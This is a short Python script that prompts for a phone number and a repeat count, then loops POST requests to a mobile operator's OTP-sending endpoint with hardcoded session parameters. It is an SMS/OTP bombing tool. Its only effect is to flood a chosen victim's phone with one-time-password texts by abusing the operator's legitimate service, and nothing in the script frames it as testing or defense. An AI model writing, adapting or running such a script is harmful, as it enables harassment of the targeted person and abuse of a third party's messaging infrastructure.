
import requests
num = input("Enter phone number:")
n = int(input("How many times:"))

paramss={'wms':"qfmvmmbjz150ua55ald5nk45","TS01a172b1":"018487e153daa83ac9769d1296743a96d422ea9219e4dd3b18deba7f4db3a92e314b01c2fd42d532d62452ba93e81a18fb58f3aad10b1ca299e2a32d5c2fe84f15e1e07b83","ws":'CRBT','type':'SEND_OTP','promo':'DWN','cattype':'RB','cid':'104061','tmpl':'22','mobile':num}
for i in range(0,n):
	requests.post("https://prbt.ncell.axiata.com/Handlers/OTPActions.ashx?lang=english",params=paramss)